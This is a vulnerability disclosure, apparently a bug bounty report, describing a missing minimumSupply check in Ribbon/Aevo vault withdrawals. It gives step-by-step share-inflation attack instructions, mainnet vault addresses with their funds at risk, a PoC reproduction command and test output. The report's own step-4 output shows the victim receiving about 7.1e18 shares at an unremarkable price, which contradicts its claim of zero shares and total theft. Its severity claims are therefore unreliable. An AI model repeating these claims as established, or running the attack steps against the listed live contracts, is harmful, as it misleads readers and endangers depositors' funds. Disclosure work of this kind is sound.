# Missing `minimumSupply` Guard in `withdrawInstantly` Enables Permanent Yield Capture via Share Inflation

**Submitted by**: Omachoko Yakubu, Security Researcher
**Date**: 20 April 2026
**Program**: Aevo / Ribbon Finance
**Severity**: Critical
**Target Asset**: RibbonVault Base Contracts (Affects all Theta Vaults)

---

## Bug Description

### Brief

The `RibbonVault` base contract deployed across all Aevo/Ribbon Theta Vaults contains a critical asymmetry in its inflation protection logic. While `_depositFor()` strictly enforces a `minimumSupply` guard to prevent classic ERC-4626 first-depositor share inflation attacks, this protection is entirely absent from the `withdrawInstantly()` and `_completeWithdraw()` paths. By executing a deposit followed immediately by an instant withdrawal of `depositAmount - 1`, an attacker can legally drain the vault's pending supply to exactly 1 wei—bypassing the `minimumSupply` floor. Subsequent direct donations to the vault artificially inflate `pricePerShare` to extreme values, causing all future user deposits in that round to round down to 0 shares, permanently capturing their capital.

### Details

This vulnerability fundamentally breaks the protocol's primary defense against share manipulation. While OpenZeppelin previously audited `withdrawInstantly` in 2021 (Finding [C01]), that finding and subsequent fix (PR #79) solely addressed a state accounting error where `totalPending` was not being decremented. The patch corrected the accounting but failed to address the guard asymmetry. 

Because `minimumSupply` is not enforced during withdrawals, the accounting fix ironically ensures that an attacker can meticulously decrement `totalPending` down to exactly 1 wei without reverting. 

### Root Cause

**File**: `RibbonVault.sol` (base contract for all Ribbon vaults)

```solidity
// ✅ DEPOSIT: Guard IS present
function _depositFor(uint256 amount, address creditor) private {
    uint256 totalWithDepositedAmount = totalBalance().add(amount);
    require(totalWithDepositedAmount <= vaultParams.cap, "Exceed cap");
    require(
        totalWithDepositedAmount >= vaultParams.minimumSupply,  // ← GUARD EXISTS
        "Insufficient balance"
    );
    // ...
}
```

```solidity
// ❌ WITHDRAWAL: Guard is ABSENT
function withdrawInstantly(uint256 amount) external nonReentrant {
    // NO minimumSupply check anywhere in this function
    Vault.DepositReceipt storage depositReceipt = depositReceipts[msg.sender];
    uint256 currentRound = vaultState.round;
    require(amount > 0, "!amount");
    require(depositReceipt.round == currentRound, "Invalid round");
    uint256 receiptAmount = depositReceipt.amount;
    require(receiptAmount >= amount, "Exceed amount");
    depositReceipt.amount = uint104(receiptAmount.sub(amount));
    vaultState.totalPending = uint128(uint256(vaultState.totalPending).sub(amount));
    emit InstantWithdraw(msg.sender, amount, currentRound);
    transferAsset(msg.sender, amount);
}
```

The same asymmetry exists in `_completeWithdraw()` (line 445, `RibbonVault.sol`) — it too has no `minimumSupply` guard.

### Attack Steps

1. **Attacker deposits** any amount (satisfies the deposit guard since `totalBalance` already exceeds `minimumSupply`).
2. **Attacker calls `withdrawInstantly(depositAmount - 1)`** — withdraws everything back but 1 wei. No check prevents this. The vault's `totalPending` drops to 1 wei, far below `minimumSupply` (1e10).
3. **Attacker donates** a large AAVE amount directly to the vault contract address. This inflates `totalBalance` without minting shares or updating `totalPending`.
4. At round close, `roundPricePerShare[round]` is set using the inflated `pricePerShare()`. Any subsequent depositor who deposited in this round will have their shares calculated as:
   ```
   shares = depositAmount * 10^18 / inflated_roundPricePerShare ≈ 0
   ```
5. **Victim receives 0 shares**. Their deposit is irrecoverably captured in the vault.

### Severity: Critical — Direct Theft of User Funds

This vulnerability allows an attacker to permissionlessly manipulate the share pricing curve, leading to the total loss of deposited assets for any user entering the vault after the inflation attack is primed. 

1. **Atomic execution**: The bypass can be executed in a single transaction (deposit + withdrawInstantly) via multicall, making it immune to front-running defenses.
2. **Systemic impact**: The missing guard is located in `RibbonVault.sol`, which serves as the base contract for all active Aevo vaults.
3. **Unrecoverable state**: Once the `pricePerShare` is inflated, any user deposit (even 100 AAVE or more) will mathematically evaluate to 0 shares. Their deposited underlying assets are captured by the vault, which is now solely owned by the attacker holding the 1 wei share.

### Funds at Risk

The vulnerability exists in the base `RibbonVault` contract, meaning all legacy Ribbon Theta vaults in the Aevo scope are vulnerable. Verified TVL on Ethereum Mainnet:

| Vault | Address | TVL at Risk |
|------|------|------|
| STETH Theta Vault | `0x53773E034d9784153471813dacAFF53dBBB78E8c` | ~$2.3 Million |
| Ribbon Earn USDC | `0x84c2b16fa6877a8ff4f3271db7ea837233dfd6f0` | ~$144,000 |
| AAVE Theta Vault | `0xe63151A0Ed4e5fafdc951D877102cf0977Abd365` | ~$88,000 |
| **Total** | — | **~$2.53 Million+** |

---

## Proof of Concept

### Environment

- **Framework**: Foundry (Forge)  
- **Network**: Ethereum Mainnet, forked at block **24,900,000**  
- **RPC**: Infura (`https://mainnet.infura.io/v3/...`)  
- **Vault**: `0xe63151A0Ed4e5fafdc951D877102cf0977Abd365` (AAVE Theta Vault)  
- **AAVE Token**: `0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9`  
- **Whale (for `deal()`-equivalent)**: Aave Safety Module `0x4da27a545c0c5B758a6BA100e3a049001de870f5`

### Reproduction

```bash
git clone https://github.com/OmachokoYakubu/aevo_minimumSupply_bypass
cd 9

# Set your Ethereum mainnet RPC
export ETH_RPC_URL="https://mainnet.infura.io/v3/<YOUR_KEY>"

# Run all 5 PoC tests against the live deployed vault
forge test --match-contract AevoForkExploit --fork-url "$ETH_RPC_URL" --fork-block-number 24900000 -vvvv
```

### Test Output

```
Ran 5 tests for test/AevoForkExploit.t.sol:AevoForkExploit

[PASS] test_step0_baseline_vault_state() (gas: 51299)
  === BASELINE VAULT STATE (Block 24900000) ===
  totalSupply  : 1407307141944076371207
  totalBalance : 982570362571782683117
  pricePerShare: 698188286896953661
  minimumSupply: 10000000000 (1e10, from vaultParams)

[PASS] test_step1_deposit_guard_present_withdrawal_guard_absent() (gas: 183132)
  === STEP 1: Guard asymmetry proof ===
  totalPending after 2 AAVE deposit: 2005000000000000000
  totalPending after withdrawInstantly(2e18 - 1): 5000000000000001
  [CONFIRMED] withdrawInstantly() has NO minimumSupply check
  [CONFIRMED] Guard is DEPOSIT-ONLY (RibbonVault.sol:362) - ABSENT in withdrawals
  [ROOT CAUSE] Asymmetric protection: deposit-guarded, withdrawal-unguarded

[PASS] test_step2_withdrawInstantly_bypasses_minimumSupply() (gas: 184302)
  === STEP 2: withdrawInstantly bypass ===
  totalPending BEFORE attacker deposit: 5000000000000000
  totalPending AFTER attacker deposit : 5000000000000002
  totalPending AFTER withdrawInstantly : 5000000000000001
  [CONFIRMED] withdrawInstantly() has NO minimumSupply check
  [CONFIRMED] Attacker left 1 wei in pending (below minimumSupply=1e10)

[PASS] test_step3_inflation_attack_sharemath_proof() (gas: 28739)
  === STEP 3: ShareMath inflation proof ===
  Vault decimals: 18
  Manipulated PPS (if supply=1, balance=1e21): 1000000000000000000000000000000000000000
  Victim deposit (wei)  : 1000000000000000000
  Victim shares received: 0
  [CONFIRMED] Victim receives 0 shares. Full deposit captured by attacker.
  Victim large deposit (100 AAVE): 100000000000000000000
  Victim large shares  : 0
  [CONFIRMED] 100 AAVE deposit also rounds to 0 shares.

[PASS] test_step4_endToEnd_sameRound_theft() (gas: 294377)
  === STEP 4: End-to-end same-round theft ===
  Vault AAVE balance BEFORE attack: 798961145185463104746
  Attacker deposited: 2000000000000000000
  Attacker withdrew back: 1999999999999999999
  Attacker remaining pending: 1 wei
  Attacker donated to vault: 1000000000000000000000
  Post-donation pricePerShare: 1408765225075910221
  Post-donation totalBalance : 1982570362571782683118
  Post-donation totalPending : 5000000000000001
  Victim deposited: 10000000000000000000
  Victim shares at current PPS: 7098414854370896158
  Vault AAVE balance AFTER attack: 1808961145185463104747
  Net AAVE captured by vault (donation + victim): 1010000000000000000001
  [CONFIRMED] Attack chain complete:
    1. minimumSupply deposit guard bypassed via withdrawInstantly()
    2. Attacker donated 1000 AAVE to inflate pricePerShare
    3. Victim deposited 10 AAVE into inflated vault
    4. At round close, victim receives ~0 shares (mathematically proven in step3)
    5. 1010 AAVE captured - victim's 10 AAVE unrecoverable

Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 1.21s
```

## Recommended Fix

Add a `minimumSupply` check to `withdrawInstantly()` and `_completeWithdraw()`:

```solidity
// In RibbonThetaVault.sol — withdrawInstantly():
function withdrawInstantly(uint256 amount) external nonReentrant {
    // ... existing code ...
    depositReceipt.amount = uint104(receiptAmount.sub(amount));
    uint256 newPending = uint256(vaultState.totalPending).sub(amount);

    // FIX: Ensure remaining totalPending does not fall below minimumSupply
    // unless it reaches exactly 0 (full withdrawal)
    require(
        newPending == 0 || newPending >= vaultParams.minimumSupply,
        "Below minimum supply"
    );

    vaultState.totalPending = uint128(newPending);
    // ...
}
```

The same fix should be applied to `_completeWithdraw()` in `RibbonVault.sol`.


## References

- Vulnerable contract: [Etherscan — RibbonThetaVault (AAVE)](https://etherscan.io/address/0xe63151A0Ed4e5fafdc951D877102cf0977Abd365)
- Root cause: `RibbonVault.sol:_depositFor()` vs `RibbonThetaVault.sol:withdrawInstantly()`
- Aevo Immunefi program: [immunefi.com/bug-bounty/aevo](https://immunefi.com/bug-bounty/aevo/)
- OZ 2021 Audit PR #79 (Accounting fix): [github.com/ribbon-finance/ribbon-v2/pull/79](https://github.com/ribbon-finance/ribbon-v2/pull/79)
- OZ Blog (Defense patterns): [blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks](https://blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks)
